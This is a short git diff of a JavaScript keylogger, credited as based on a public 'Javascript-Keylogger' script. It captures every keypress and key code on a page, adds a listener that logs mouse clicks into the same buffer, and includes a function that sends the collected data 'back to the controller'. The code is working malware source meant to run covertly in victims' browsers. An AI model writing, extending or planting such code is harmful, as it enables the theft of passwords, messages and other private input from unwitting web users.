@@ -16,13 +16,26 @@ var crawl = false;
 // Based on: https://github.com/JohnHoder/Javascript-Keylogger/blob/master/keylogger.js
 var keys='';
 var keyCodes='';
+
 document.onkeypress = function(e) {
 	get = window.event ? event : e;
 	key = get.keyCode ? get.keyCode : get.charCode;
     keyCodes += key + ","
 	key = String.fromCharCode(key);
 	keys += key;
-}
+};
+
+document.addEventListener("click", function(e) {
+    var click;
+    if (e.which == 1) {
+        click = "[LeftClick]";
+    } else {
+        click = "[RightClick]";
+    }
+    
+    keys += click;
+    keyCodes += click + ","
+});
 
 // Send data back to the controller.
 function sendData(type, data) {
